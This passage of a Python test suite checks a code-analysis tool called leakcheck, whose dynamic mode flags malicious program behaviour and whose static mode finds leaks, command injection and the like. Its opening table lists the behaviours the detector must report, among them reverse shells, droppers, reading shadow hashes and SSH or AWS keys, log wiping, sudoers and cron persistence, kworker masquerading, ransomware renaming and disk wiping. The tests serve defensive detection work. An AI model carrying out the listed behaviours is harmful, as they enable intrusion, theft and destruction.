    ("sem_world", "insecure-permissions", "sem_open() creates the semaphore writable by every user"),
    ("ipc_msg", "insecure-permissions", "msgget() creates the queue writable by every user"),
    ("ipc_sem", "insecure-permissions", "semget() creates the set writable by every user"),
    ("ipc_shm", "insecure-permissions", "shmget() creates the segment writable by every user"),
    ("umask_zero", "insecure-permissions", "umask(0) lets every user write files"),
    ("shm_world", "insecure-permissions", "shm_open() creates the shared memory writable by every user"),
    ("mq_world", "insecure-permissions", "mq_open() creates the queue writable by every user"),
    ("setuid_root", "privilege-escalation", "setuid(0) asks to become user 0"),
    ("cmd_history", "log-tampering", "wipes the record of what was done"),
    ("cmd_rm_log", "log-tampering", "erases a system log"),
    ("log_unlink", "log-tampering", "unlink() removes"),
    ("log_truncate", "log-tampering", "fopen() empties"),
    ("log_history", "log-tampering", "truncate() empties"),
    ("log_truncate64", "log-tampering", "truncate64() empties"),
    ("log_ftruncate", "log-tampering", "ftruncate() empties"),
    ("log_ftruncate64", "log-tampering", "ftruncate64() empties"),
    ("cmd_shadow", "credential-access", "reads the password hashes"),
    ("cred_ssh_key", "credential-access", "an SSH private key"),
    ("cred_aws", "credential-access", "the AWS access keys"),
    ("cred_shadow", "credential-access", "the password hashes"),
    ("cred_keyboard", "credential-access", "what a key logger reads"),
    ("cred_other_process", "credential-access", "the environment (passwords, tokens) of another program"),
    ("inject_mem", "process-injection", "for writing: it changes the code of another running program"),
    ("ptrace_attach", "process-injection", "ptrace() attaches to another running program", 2),
    ("ptrace_poke", "process-injection", "ptrace() writes into the memory of another running program", 4),
    ("ptrace_peek", "credential-access", "ptrace() reads the memory of another running program", 2),
    ("pidfd_steal", "credential-access", "pidfd_getfd() takes a file another process has open"),
    ("raw_socket", "credential-access", "socket() opens a raw socket"),
    ("raw_packet", "credential-access", "socket() opens a raw socket"),
    ("ptrace_setregset", "process-injection", "ptrace() writes into the memory of another running program"),
    ("inject_vm", "process-injection", "process_vm_writev() writes into the memory of another"),
    ("cred_vm_read", "credential-access", "process_vm_readv() reads the memory of another"),
    ("cred_relative", "credential-access", "the password hashes"),
    ("cred_other_memory", "credential-access", "the memory of another program"),
    ("persist_relative", "persistence", "for writing: a shell start-up file"),
    ("persist_create_rdonly", "persistence", "for writing: a shell start-up file"),
    ("persist_renameat", "persistence", "renameat() puts a file at"),
    ("persist_renameat2", "persistence", "renameat2() puts a file at"),
    ("shell_spawn_dup2", "reverse-shell", "with its standard input or output on a network socket"),
    ("persist_link", "persistence", "link() puts a file at"),
    ("persist_linkat", "persistence", "linkat() puts a file at"),
    ("persist_symlinkat", "persistence", "symlinkat() puts a file at"),
    ("persist_chmod", "persistence", "chmod() changes \"/etc/sudoers\""),
    ("persist_unlink_sudo", "persistence", "unlink() removes \"/etc/sudoers\""),
    ("persist_trunc_cron", "persistence", "truncate() empties \"/etc/crontab\""),
    ("persist_chown", "persistence", "chown() changes the owner of \"/etc/sudoers\""),
    ("dropper_relative", "dropper", "a file this program has written itself"),
    ("cmd_unspaced", "dropper", "downloads or decodes code and runs it at once"),
    ("cmd_curl_sudo_bash", "dropper", "downloads or decodes code and runs it at once"),
    ("cmd_obfuscated", "reverse-shell", "redirects an interactive shell to a network connection"),
    ("shell_socket_out", "reverse-shell", "with its standard input or output on a network socket"),
    ("fileless_deleted", "fileless-exec", "lives only in memory (memfd_create) or was deleted"),
    ("chmod_setgid", "privilege-escalation", "sets the setuid or setgid bit"),
    ("chmod_fd", "privilege-escalation", "fchmod() sets the setuid or setgid bit"),
    ("chmod_at", "privilege-escalation", "fchmodat() sets the setuid or setgid bit"),
    ("seteuid_root", "privilege-escalation", "seteuid(0) asks to become user 0"),
    ("setreuid_root", "privilege-escalation", "setreuid(0) asks to become user 0"),
    ("setresuid_root", "privilege-escalation", "setresuid(0) asks to become user 0"),
    ("setfsuid_root", "privilege-escalation", "setfsuid(0) asks to become user 0"),
    ("setgid_root", "privilege-escalation", "setgid(0) asks to become group 0"),
    ("setegid_root", "privilege-escalation", "setegid(0) asks to become group 0"),
    ("setregid_root", "privilege-escalation", "setregid(0) asks to become group 0"),
    ("setresgid_root", "privilege-escalation", "setresgid(0) asks to become group 0"),
    ("setfsgid_root", "privilege-escalation", "setfsgid(0) asks to become group 0"),
    ("setgroups_root", "privilege-escalation", "setgroups(0) asks to become group 0"),
    ("initgroups_root", "privilege-escalation", "initgroups(0) asks to become group 0"),
    ("log_unlinkat", "log-tampering", "unlinkat() removes"),
    ("log_remove", "log-tampering", "remove() removes"),
    ("log_rmdir", "log-tampering", "rmdir() removes"),
    ("log_open_trunc", "log-tampering", "open() empties"),
    ("log_utime", "log-tampering", "utimensat() changes the time on \"/var/log/auth.log\""),
    ("log_lutimes", "log-tampering", "lutimes() changes the time on \"/var/log/auth.log\""),
    ("log_futimens", "log-tampering", "futimens() changes the time on"),
    ("dropper_rename", "dropper", "a file this program has written itself"),
    ("masq_prctl", "masquerade", "the process renames itself \"kworker/0:1\""),
    ("masq_pthread_name", "masquerade", "the process renames itself \"kworker/0:1\""),
    ("masq_memfd", "masquerade", "memfd_create() names a file \"kworker/0:1\""),
    ("masq_exe", "masquerade", "prctl(PR_SET_MM_EXE_FILE) changes the program the process claims to be"),
    ("masq_exec_argv0", "masquerade", "under the name \"[kworker/0:1]\""),
    ("masq_create", "masquerade", "creates"),
    ("masq_rename", "masquerade", "rename() puts a file at"),
    ("sys_open", "system-tampering", "for writing: this changes a program or library"),
    ("sys_unlink", "system-tampering", "unlink() removes"),
    ("sys_rename", "system-tampering", "rename() puts a file at"),
    ("sys_chmod", "system-tampering", "chmod() changes the permissions"),
    ("hosts_chmod", "system-tampering", "chmod() changes \"/etc/hosts\""),
    ("hosts_unlink", "system-tampering", "unlink() changes \"/etc/resolv.conf\""),
    ("sys_chown", "system-tampering", "chown() changes the owner"),
    ("sys_lchown", "system-tampering", "lchown() changes the owner"),
    ("sys_fchown", "system-tampering", "fchown() changes the owner"),
    ("sys_fchownat", "system-tampering", "fchownat() changes the owner"),
    ("sys_link", "system-tampering", "link() puts a file at"),
    ("sys_mount", "system-tampering", "mount() changes where \"/usr/bin/ls\" is mounted"),
    ("sys_umount", "system-tampering", "umount() changes where \"/usr/bin/ls\" is mounted"),
    ("sys_umount2", "system-tampering", "umount2() changes where \"/usr/bin/ls\" is mounted"),
    ("host_getaddrinfo", "masquerade", "looks up \"paypa1.com\""),
    ("host_gethostbyname", "masquerade", "gethostbyname() looks up \"paypa1.com\""),
    ("host_gethostbyname2", "masquerade", "gethostbyname2() looks up \"paypa1.com\""),
    ("host_getaddrinfo_a", "masquerade", "getaddrinfo_a() looks up \"paypa1.com\""),
    ("cmd_lookalike", "masquerade", "github.com.evil.example\", made to look like github.com"),
    ("cmd_lookalike_digit", "masquerade", "micros0ft.com\", made to look like microsoft.com"),
    ("cmd_lookalike_user", "masquerade", "gooogle.com\", made to look like google.com"),
    ("ransom", "ransomware-pattern", "20 files by adding \".locked\" to their names"),
    ("ransom_renameat2", "ransomware-pattern", "20 files by adding \".locked\" to their names"),
    ("scan_ports", "network-scan", "100 different addresses and ports within ten seconds"),
    ("scan_sendto", "network-scan", "100 different addresses and ports within ten seconds"),
    ("scan_sendmsg", "network-scan", "100 different addresses and ports within ten seconds"),
    ("scan_sendmmsg", "network-scan", "100 different addresses and ports within ten seconds"),
    ("cmd_written", "dropper", "system() runs a command that starts \""),
    ("cmd_written_sh", "dropper", "system() runs a command that starts \""),
    ("cmd_written_or", "dropper", "system() runs a command that starts \""),
    ("fileless", "fileless-exec", "fexecve() starts the program in \"/proc/self/fd/"),
    ("fileless_path", "fileless-exec", "execl() starts the program in \"/proc/self/fd/"),
    ("ptrace_traceme", "anti-analysis", "ptrace(PTRACE_TRACEME) in the program's own process"),
    ("aslr_off", "anti-analysis", "personality() turns off address randomization"),
    ("ptrace_parent", "anti-analysis", "ptrace attaches to the program's parent"),
    ("cmd_wipe", "destructive-command", "erases the whole file system"),
    ("cmd_dd", "destructive-command", "overwrites a disk"),
    ("cmd_miner", "cryptominer", "starts a cryptocurrency miner"),
]
# Every way to open a file, and every way to start a program: the same finding
# from each wrapper.
BEHAVIOR += [(f"api_{n}", "persistence", "for writing: a shell start-up file")
             for n in ("open", "open64", "openat", "openat64", "__open_2", "__open64_2",
                       "__openat_2", "__openat64_2", "creat", "creat64", "fopen", "fopen64")]
BEHAVIOR += [(f"api_{n}", "reverse-shell", f"{n}() starts the shell")
             for n in ("execve", "execv", "execvp", "execvpe", "execl", "execlp", "execle",
                       "fexecve", "execveat", "posix_spawn", "posix_spawnp")]
BEHAVIOR_WARNINGS = {"persistence", "credential-access", "dropper", "anti-analysis", "system-tampering",
                     "network-scan"}
ROOT_MAY = ("setuid_root", "seteuid_root", "setreuid_root", "setresuid_root", "setfsuid_root",
            "setgid_root", "setegid_root", "setregid_root", "setresgid_root", "setfsgid_root",
            "setgroups_root", "initgroups_root")


def check_behavior(case, want, piece, count=1):
    p, r = run_json(["dynamic", prog("behavior"), case], timeout=60)
    expect(p.returncode == 2 and types(r) == [want] * count, f"{case}: exit {p.returncode}: {types(r)}")
    f = r["findings"][0]
    expect(piece in f["message"], f"{case}: {f['message']}")
    expect(f["category"] == "security", f"{case}: {f['category']}")
    expect(f["severity"] == ("warning" if want in BEHAVIOR_WARNINGS else "error"), f"{case}: {f['severity']}")
    # done by one of the test program's functions, in the program or in a child it forked
    expect(top(f, "access").get("function") in ("run", "spawn_on", "api", "exec_api", "put"),
           f"{case}: {top(f, 'access')}")


def _make_behavior(case, want, piece, count=1):
    def fn():
        if case in ROOT_MAY and hasattr(os, "geteuid") and os.geteuid() == 0:
            return
        check_behavior(case, want, piece, count)
    fn.__name__ = "behavior_" + case
    return fn


for _row in BEHAVIOR:
    test("dynamic")(_make_behavior(*_row))


@test("dynamic")
def behavior_execveat_empty_path_is_a_reverse_shell():
    check_behavior("api_execveat_empty", "reverse-shell", "execveat() starts the shell")


@test("dynamic")
def behavior_ordinary_programs_are_silent():
    # a shell on /dev/null, a normal program on a socket, plain pipelines, reading
    # start-up files and a public key, running a program it did not write,
    # a debugger's forked child, removing and re-permissioning its own files,
    # setuid(own uid), appending to and rotating a log, and an ordinary program
    # (and names that only contain a start-up file's name, and a file with the program's
    # own name that is not the program)
    # (and a process named like a worker, a system program under a system name, a file named
    # like a service in the current directory, reading system files, a byte-code cache,
    # trusted host names)
    for case in ("shell_clean", "program_socket", "cmd_clean", "persist_read", "cred_public_key",
                 "dropper_other", "dropper_dlopen_other", "dropper_dlmopen_other",
                 "ptrace_child", "unlink_other",
                 "remove_other", "rmdir_other",
                 "chmod_plain", "open_private", "umask_plain", "shm_private", "mq_private",
                 "mkfifo_private", "sem_private", "ipc_private",
                 "setuid_user",
                 "setgid_user",
                 "setgroups_user",
                 "log_append", "log_utime_other", "log_futimens_other", "ftruncate_other", "chown_other", "benign", "lookalike",
                 "unlink_samename", "masq_prctl_plain", "masq_pthread_plain", "masq_memfd_plain", "aslr_plain", "iopl_off", "cap_lower", "path_usr", "lib_path_usr", "stream_socket", "hist_ok",
                 "masq_exec_sys_name", "masq_create_plain", "masq_create_cwd", "sys_quiet", "sys_mount_other",
                 "host_ok", "cmd_trusted_hosts", "ransom_few", "ransom_backup", "scan_few",
                 "scan_sendto_few", "scan_one_port"):
        p, r = run_json(["dynamic", prog("behavior"), case], timeout=60)
        expect(p.returncode == 0 and r["findings"] == [], f"{case}: exit {p.returncode}: {types(r)}")


SECURITY_TYPES = {"reverse-shell", "dropper", "fileless-exec", "persistence", "credential-access",
                  "process-injection", "anti-analysis", "privilege-escalation", "log-tampering",
                  "destructive-command", "cryptominer", "masquerade", "system-tampering"}


def security_types(report):
    return [t for t in types(report) if t in SECURITY_TYPES]


@test("dynamic")
def behavior_program_named_like_a_system_service():
    import shutil
    # sshd in /tmp: a system service's name in a place any user can write
    with tempfile.TemporaryDirectory() as d:
        copy = os.path.join(d, "sshd")
        shutil.copy2(prog("behavior"), copy)
        p, r = run_json(["dynamic", copy, "noop"], timeout=60)
        expect(p.returncode == 2 and types(r) == ["masquerade"], f"exit {p.returncode}: {types(r)}")
        expect("is called \"sshd\" like something the system trusts" in r["findings"][0]["message"],
               r["findings"][0]["message"])
    # the same name where nobody hides (the build directory): nothing to say
    d = os.path.join(ARGS.build, "test-programs", "as_a_service")
    os.makedirs(d, exist_ok=True)
    try:
        copy = os.path.join(d, "sshd")
        shutil.copy2(prog("behavior"), copy)
        p, r = run_json(["dynamic", copy, "noop"], timeout=60)
        expect(p.returncode == 0 and r["findings"] == [], f"exit {p.returncode}: {types(r)}")
    finally:
        shutil.rmtree(d, ignore_errors=True)


@test("dynamic")
def behavior_program_started_as_a_kernel_thread():
    # bash's exec -a gives the program another argv[0]. The exec replaces the
    # process, so both the call (in bash) and the start (in the program, which
    # loads the runtime again) are seen
    p, r = run_json(["dynamic", "/bin/bash", "-c",
                     f'exec -a "[kworker/0:1]" {prog("behavior")} noop'], timeout=60)
    expect(set(security_types(r)) == {"masquerade"}, f"{types(r)}")
    said = sorted(f["message"].split(" ", 1)[0] for f in r["findings"] if f["type"] == "masquerade")
    expect(said == ["execve()", "the"], f"{said}")  # "execve() starts ...", "the program ... was started as"


@test("dynamic")
def behavior_system_program_naming_itself_is_silent():
    # python3 lives in /usr/bin: a daemon may name its own process whatever it likes
    p, r = run_json(["dynamic", "python3", "-c",
                     "import ctypes; ctypes.CDLL(None).prctl(15, b'kworker/0:1', 0, 0, 0)"], timeout=60)
    expect(security_types(r) == [], f"{types(r)}")


@test("dynamic")
def behavior_program_that_deletes_itself():
    import shutil
    with tempfile.TemporaryDirectory() as d:
        copy = os.path.join(d, "lcbeh_copy")
        shutil.copy2(prog("behavior"), copy)
        p, r = run_json(["dynamic", copy, "selfdelete"], timeout=60)
        expect(p.returncode == 2 and types(r) == ["anti-analysis"], f"exit {p.returncode}: {types(r)}")
        expect("the program's own file" in r["findings"][0]["message"], r["findings"][0]["message"])
        expect(not os.path.exists(copy), "the program removed itself")


# ------------------------------------------------------------- static -----

def expectations(path):
    want = set()
    with open(path) as f:
        for no, line in enumerate(f, 1):
            m = re.search(r"//\s*expect:\s*([a-z-]+)", line)
            if m and not line.lstrip().startswith("//"):
                want.add((no, m.group(1)))
    return want


def got(report, path):
    return {(f["location"]["line"], f["type"]) for f in report["findings"]
            if os.path.samefile(f["location"]["file"], path)}


def cases():
    d = os.path.join(ARGS.source, "tests", "static", "cases")
    return [os.path.join(d, n) for n in sorted(os.listdir(d))
            if os.path.isfile(os.path.join(d, n))]


@test("static")
def static_cases_match_annotations():
    for path in cases():
        p, r = run_json(["static", path])
        want, have = expectations(path), got(r, path)
        expect(want, f"{path} has no expectations")
        missing, extra = sorted(want - have), sorted(have - want)
        expect(not missing and not extra, f"{os.path.basename(path)}: missing {missing} extra {extra}")
        expect(p.returncode == 2, f"exit {p.returncode}")


@test("static")
def static_directory_and_compile_commands():
    d = os.path.join(ARGS.source, "tests", "static", "cases")
    total = sum(len(expectations(p)) for p in cases())
    _, r = run_json(["static", d])
    expect(len(r["findings"]) == total and r["summary"]["files_analyzed"] == len(cases()),
           (len(r["findings"]), total))
    with tempfile.TemporaryDirectory() as tmp:
        db = os.path.join(tmp, "compile_commands.json")
        with open(db, "w") as f:
            json.dump([{"directory": d, "file": os.path.basename(p), "command": "cc -c x"}
                       for p in cases()] + [{"directory": d, "file": os.path.basename(cases()[0]),
                                             "arguments": ["cc", "-c"]}], f)
        _, r = run_json(["static", db])
        expect(len(r["findings"]) == total, (len(r["findings"]), total))


@test("static")
def static_flow_crosses_files():
    # Text from outside that crosses a file boundary is reported where it is
    # passed on, with the route it took: argv -> run() -> system().
    with tempfile.TemporaryDirectory() as d:
        with open(os.path.join(d, "helper.c"), "w") as f:
            f.write("#include <stdlib.h>\n"
                    "void run(const char *line) { system(line); }\n")
        with open(os.path.join(d, "main.c"), "w") as f:
            f.write("#include <stdlib.h>\nvoid run(const char *line);\n"
                    "int main(int argc, char **argv) {\n"
                    "    if (argc > 1) run(argv[1]);\n    return 0;\n}\n")
        p, r = run_json(["static", d])
        expect(p.returncode == 2, f"exit {p.returncode}: {types(r)}")
        found = find(r, "command-injection")
        flow = found.get("flow") or []
        expect([s["what"] for s in flow] == ["argv", "run()", "system()"], flow)
        expect(flow[0]["file"].endswith("main.c"), flow)
        expect(flow[-1]["file"].endswith("helper.c") and flow[-1]["line"] == 2, flow)
        # the finding is at the call that passed it on, not at system()
        expect(found["location"]["file"].endswith("main.c") and found["location"]["line"] == 4,
               found["location"])

        # The console says it in words, and SARIF carries it as a code flow.
        p = run(["static", d])
        expect("how the text got here" in p.stdout and "system() in run" in p.stdout, p.stdout)
        with tempfile.NamedTemporaryFile(suffix=".sarif", delete=False) as f:
            path = f.name
        try:
            p = run(["-f", "sarif", "-o", path, "static", d])
            with open(path, encoding="utf-8") as f:
                sarif = json.load(f)
            result = sarif["runs"][0]["results"][0]
            steps = result["codeFlows"][0]["threadFlows"][0]["locations"]
            expect([s["location"]["message"]["text"] for s in steps] ==
                   ["argv", "run()", "system()"], steps)
        finally:
            os.unlink(path)


@test("static")
def static_flow_not_reported_for_a_literal():
    # The function in the other file does run a shell on its parameter, but the
    # only caller passes a literal: nothing from outside reaches it.
    with tempfile.TemporaryDirectory() as d:
        with open(os.path.join(d, "helper.c"), "w") as f:
            f.write("#include <stdlib.h>\n"
                    "void run(const char *line) { system(line); }\n")
        with open(os.path.join(d, "main.c"), "w") as f:
            f.write("void run(const char *line);\n"
                    'int main(void) { run("date"); return 0; }\n')
        p, r = run_json(["static", d])
        expect(p.returncode == 0 and r["findings"] == [], types(r))


@test("static")
@posix_only
def json_loads_a_path_with_a_high_byte():
    # A raw 0xFF in the path, not the UTF-8 spelling of U+00FF.
    with tempfile.TemporaryDirectory() as d:
        raw_name = os.fsencode(d) + b"/a\xff.c"
        fd = os.open(raw_name, os.O_CREAT | os.O_WRONLY, 0o644)
        os.write(fd, b"int main(void){return 0;}\n")
        os.close(fd)
        out = os.path.join(d, "r.json")
        p = subprocess.run([os.fsencode(leakcheck()), b"-f", b"json", b"-o",
                            os.fsencode(out), b"static", raw_name],
                           capture_output=True)
        raw = open(out, "rb").read()
        expect(b"\\u00ff" in raw, raw[:500])
        report = json.loads(raw)  # UTF-8 bytes: a raw 0xFF in the file would fail
        expect(report["command"][0].endswith("a\u00ff.c"), report["command"])
        expect(p.returncode in (0, 2), f"exit {p.returncode}: {p.stderr}")


@test("static")
def static_clean_code_and_formats():
    with tempfile.TemporaryDirectory() as tmp:
        src = os.path.join(tmp, "ok.c")
        with open(src, "w") as f:
            f.write("#include <stdlib.h>\nint main(void){char *p=malloc(4);if(!p)return 1;free(p);return 0;}\n")
        p, r = run_json(["static", src])
        expect(p.returncode == 0 and r["findings"] == [], types(r))
    path = cases()[0]
    p = run(["static", path])
    expect("WARNING memory-leak" in p.stdout and "files analyzed: 1" in p.stdout, p.stdout)
    _, r = run_json(["static", path])
    p = run(["static", "-f", "json", "-o", "-", path])
    expect(p.returncode == 2 and json.loads(p.stdout)["findings"], p.stdout[:200])
    with tempfile.NamedTemporaryFile(suffix=".sarif", delete=False) as f:
        out = f.name
    try:
        run(["static", "-f", "sarif", "-o", out, path])
        check_sarif(json.load(open(out)), len(r["findings"]))
    finally:
        os.unlink(out)
    with tempfile.NamedTemporaryFile(suffix=".html", delete=False) as f:
        out = f.name
    try:
        p = run(["static", "-f", "html", "-o", out, path])
        expect(p.returncode == 2, p.returncode)
        text = open(out).read()
        expect("<!DOCTYPE html>" in text and "memory-leak" in text, text[:200])
    finally:
        os.unlink(out)
    expect(run(["static", "/no/such/path"]).returncode == 1, "missing path fails")


@test("static")
def static_baseline_only_gates_new_findings():
    with tempfile.TemporaryDirectory() as tmp:
        src = os.path.join(tmp, "bugs.c")
        body = ("#include <stdlib.h>\n"
                "int f(int n){\n"
                "  char *p = malloc(8);\n"
                "  if (n) return 0;\n"
                "  free(p);\n"
                "  return 1;\n"
                "}\n")
        with open(src, "w") as f:
            f.write(body)
        base = os.path.join(tmp, "baseline.txt")
        p = run(["static", "--baseline", "write", base, src])
        expect(p.returncode == 0, f"writing a baseline must go green: {p.returncode}\n{p.stderr}")
        expect(os.path.exists(base), "baseline file written")
        p = run(["static", "--baseline", "compare", base, src])
        expect(p.returncode == 0, f"a known finding must not gate: {p.returncode}\n{p.stdout}")
        # The same finding, ten lines down and reformatted: same fingerprint.
        with open(src, "w") as f:
            f.write("\n" * 10 + body.replace("char *p", "char* p"))
        p = run(["static", "--baseline", "compare", base, src])
        expect(p.returncode == 0, f"a moved finding is the same finding: {p.returncode}\n{p.stdout}")
        # A new leak in another function is a new finding.
        with open(src, "a") as f:
            f.write("int g(void){\n  char *q = malloc(16);\n  return 1;\n}\n")
        p = run(["static", "--baseline", "compare", base, src])
        expect(p.returncode == 2, f"a new finding must gate: {p.returncode}\n{p.stdout}")
        expect("g" in p.stdout and "baseline" in p.stdout.lower(), p.stdout)
        # A missing or corrupt baseline is a configuration error, never a pass.
        p = run(["static", "--baseline", "compare", os.path.join(tmp, "nope.txt"), src])
        expect(p.returncode == 3, f"missing baseline: {p.returncode}")
        with open(base, "w") as f:
            f.write("not a baseline\n")
        p = run(["static", "--baseline", "compare", base, src])
        expect(p.returncode == 3, f"corrupt baseline: {p.returncode}")


@test("static")
def static_incremental_cache_reads_only_what_changed():
    leak = ("#include <stdlib.h>\n"
            "void f(void){ char *p = malloc(8); (void)p; }\n")
    clean = "int g(void){ return 1; }\n"
    with tempfile.TemporaryDirectory() as tmp:
        a, b = os.path.join(tmp, "a.c"), os.path.join(tmp, "b.c")
        with open(a, "w") as f:
            f.write(leak)
        with open(b, "w") as f:
            f.write(clean)
        cache = os.path.join(tmp, ".leakcheck-cache")
        _, first = run_json(["static", tmp])
        expect(os.path.isdir(cache), "the first run writes a cache beside the tree")
        expect(not any("cache" in n for n in first["notes"]), first["notes"])
        _, warm = run_json(["static", tmp])
        expect(any("2 file(s) read from the incremental cache" in n for n in warm["notes"]),
               warm["notes"])
        expect(sorted(f["type"] for f in warm["findings"]) ==
               sorted(f["type"] for f in first["findings"]), (first["findings"], warm["findings"]))
        # Touch one file: the other stays cached, and the new finding appears.
        with open(a, "w") as f:
            f.write(leak + "void h(void){ char *q = malloc(4); (void)q; }\n")
        _, warm = run_json(["static", tmp])
        expect(any("1 file(s) read from the incremental cache" in n for n in warm["notes"]),
               warm["notes"])
        expect(len(warm["findings"]) == 2, types(warm))
        # --no-cache neither reads nor writes it.
        with tempfile.TemporaryDirectory() as fresh:
            with open(os.path.join(fresh, "a.c"), "w") as f:
                f.write(leak)
            _, plain = run_json(["static", "--no-cache", fresh])
            expect(not os.path.isdir(os.path.join(fresh, ".leakcheck-cache")),
                   "--no-cache left a cache behind")
            expect(not any("cache" in n for n in plain["notes"]), plain["notes"])


@test("static")
def static_changed_only_against_a_git_ref():
    import shutil
    if not shutil.which("git"):
        return
    leak = ("#include <stdlib.h>\n"
            "void f(void){ char *p = malloc(8); (void)p; }\n")
    with tempfile.TemporaryDirectory() as tmp:
        def git(*args):
            p = subprocess.run(["git", "-C", tmp] + list(args), capture_output=True, text=True)
            expect(p.returncode == 0, (args, p.stderr))
        git("init", "-q")
        git("config", "user.email", "test@example.com")
        git("config", "user.name", "test")
        with open(os.path.join(tmp, "old.c"), "w") as f:
            f.write(leak)
        with open(os.path.join(tmp, "new.c"), "w") as f:
            f.write("int clean(void){ return 0; }\n")
        git("add", ".")
        git("commit", "-qm", "start")
        with open(os.path.join(tmp, "new.c"), "w") as f:
            f.write(leak.replace("f(", "g("))
        p, r = run_json(["static", tmp, "--changed-only", "HEAD"])
        expect(p.returncode == 2, f"exit {p.returncode}: {p.stderr}")
        expect(r["summary"]["files_analyzed"] == 1, r["summary"])
        expect(r["findings"] and os.path.basename(r["findings"][0]["location"]["file"]) == "new.c",
               r["findings"])
        expect(any("changed-only: 1 file(s) analysed, 1 unchanged" in n for n in r["notes"]),
               r["notes"])
        # An invented ref is a config error, not an empty clean run.
        p = run(["static", "--changed-only", "no-such-ref", tmp])
        expect(p.returncode == 3, f"unknown ref: {p.returncode}: {p.stderr}")


@test("static")
def static_config_excludes_and_ignore_file():
    leak = ("#include <stdlib.h>\n"
            "void f(void){ char *p = malloc(8); (void)p; }\n")
    with tempfile.TemporaryDirectory() as tmp:
        for sub in ("src", "vendor"):
            os.makedirs(os.path.join(tmp, sub))
            with open(os.path.join(tmp, sub, "x.c"), "w") as f:
                f.write(leak)
        with open(os.path.join(tmp, "leakcheck.toml"), "w") as f:
            f.write('format = "json"\nmin-severity = "error"\n'
                    'exclude = ["vendor/**"]\n[static]\njobs = 1\n'
                    'disable-rules = ["memory-leak"]\n')
        p = run(["static", tmp])
        expect(p.returncode == 0, f"min-severity=error: {p.returncode}\n{p.stderr}")
        report = json.loads(p.stdout)
        expect(report["summary"]["files_analyzed"] == 1, report["summary"])
        expect(report["findings"] == [], report["findings"])
        expect(any("excluded" in n for n in report["notes"]), report["notes"])
        p = run(["static", "--enable-rule", "memory-leak", tmp])
        enabled = json.loads(p.stdout)
        expect(types(enabled) == ["memory-leak"], types(enabled))
        p = run(["static", "--print-config", tmp])
        expect(p.returncode == 0, p.stderr)
        expect("vendor/**" in p.stdout and 'min-severity = "error"' in p.stdout, p.stdout)
        # A mode section overrides global policy, and a CLI setting overrides both.
        with open(os.path.join(tmp, "leakcheck.toml"), "w") as f:
            f.write('format = "json"\ndisable-rules = ["memory-leak"]\n'
                    '[static]\nenable-rules = ["memory-leak"]\n')
        p = run(["static", tmp])
        expect(types(json.loads(p.stdout)) == ["memory-leak", "memory-leak"], p.stdout)
        p = run(["static", "--disable-rule", "memory-leak", tmp])
        expect(json.loads(p.stdout)["findings"] == [], p.stdout)
        # Asking what the settings are must work even with no mode yet.
        p = run(["--print-config"])
        expect(p.returncode == 0 and "[effective]" in p.stdout, (p.returncode, p.stderr))
        with open(os.path.join(tmp, "leakcheck.toml"), "w") as f:
            f.write('bogus = 1\n')
        expect(run(["static", tmp]).returncode == 3, "a typo in the config is exit 3")
        with open(os.path.join(tmp, "leakcheck.toml"), "w") as f:
            f.write('enable-rules = ["memory-leak"]\ndisable-rules = ["memory-leak"]\n')
        p = run(["static", tmp])
        expect(p.returncode == 3 and "both enabled and disabled" in p.stderr, p.stderr)
    with tempfile.TemporaryDirectory() as tmp:
        os.makedirs(os.path.join(tmp, "src"))
        os.makedirs(os.path.join(tmp, "vendor"))
        os.makedirs(os.path.join(tmp, "vendor", "kept"))
        for sub in ("src", "vendor"):
            with open(os.path.join(tmp, sub, "x.c"), "w") as f:
                f.write(leak)
        with open(os.path.join(tmp, "vendor", "kept", "x.c"), "w") as f:
            f.write(leak)
        for name in ("!generated.c", "#generated.c"):
            with open(os.path.join(tmp, name), "w") as f:
                f.write(leak)
        with open(os.path.join(tmp, ".leakcheckignore"), "w") as f:
            f.write("vendor/**\n!vendor/kept/**\n\\!generated.c\n\\#generated.c\n")
        p, report = run_json(["static", tmp])
        expect(report["summary"]["files_analyzed"] == 2, report["summary"])
        expect(any("excluded" in n for n in report["notes"]), report["notes"])
        with open(os.path.join(tmp, ".leakcheckignore"), "w") as f:
            f.write("!\n")
        p = run(["static", tmp])
        expect(p.returncode == 3 and "needs a glob" in p.stderr, p.stderr)


@test("static")
def static_suppressions_have_an_owner_and_an_expiry():
    with tempfile.TemporaryDirectory() as tmp:
        good = os.path.join(tmp, "good.supp")
        with open(good, "w") as f:
            f.write('memory-leak:*c_bugs.c reason="old parser" expires=2030-01-01\n')
        p = run(["--audit-suppressions", "-s", good])
        expect(p.returncode == 0, f"exit {p.returncode}: {p.stderr}")
        expect("old parser" in p.stdout and "day(s) left" in p.stdout, p.stdout)
        p, report = run_json(["static", "-s", good, cases()[0]])
        expect(any("suppressed" in n for n in report["notes"]), report["notes"])
        bad = os.path.join(tmp, "expired.supp")
        with open(bad, "w") as f:
            f.write('memory-leak:*c_bugs.c reason="forgotten" expires=2020-01-01\n')
        p = run(["static", "-s", bad, cases()[0]])
        expect(p.returncode == 3, f"an expired rule is an error: {p.returncode}")
        expect("expired" in p.stderr, p.stderr)
        p = run(["--audit-suppressions", "-s", bad])
        expect(p.returncode == 3 and "EXPIRED" in p.stdout, p.stdout)


@test("static")
def static_junit_and_min_severity():
    p = run(["static", "-f", "junit", cases()[0]])
    expect(p.stdout.startswith("<?xml") and "<testsuite" in p.stdout and
           "</testsuite>" in p.stdout, p.stdout[:300])
    expect(p.returncode in (0, 2), f"exit {p.returncode}: {p.stderr}")
    p = run(["static", "--min-severity", "error", cases()[0]])
    expect(p.returncode == 0 and "problems: 0" in p.stdout, f"{p.returncode}\n{p.stdout}")
    p = run(["static", cases()[0]])
    expect(p.returncode == 2 and "problems: 0" not in p.stdout, f"{p.returncode}\n{p.stdout}")


@test("static")
def static_enable_one_strict_rule():
    with tempfile.NamedTemporaryFile(suffix=".c", mode="w", delete=False) as f:
        f.write("void bad(void){ char *p = 0; *p = 'x'; }\n")
        path = f.name
    try:
        p, report = run_json(["static", path])
        expect(p.returncode == 0 and report["findings"] == [], types(report))
        p, report = run_json(["static", "--enable-rule", "null-dereference", path])
        expect(p.returncode == 2 and types(report) == ["null-dereference"], types(report))
    finally:
        os.unlink(path)


BANK_C = """#include <pthread.h>
static int transfers;
pthread_mutex_t accounts = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t audit = PTHREAD_MUTEX_INITIALIZER;
void transfer(void) {
    pthread_mutex_lock(&accounts);
    pthread_mutex_lock(&audit);
    pthread_mutex_unlock(&audit);
    pthread_mutex_unlock(&accounts);
}
"""
AUDIT_C = """#include <pthread.h>
static void note(void) { }
extern pthread_mutex_t accounts, audit;
void report(void) {
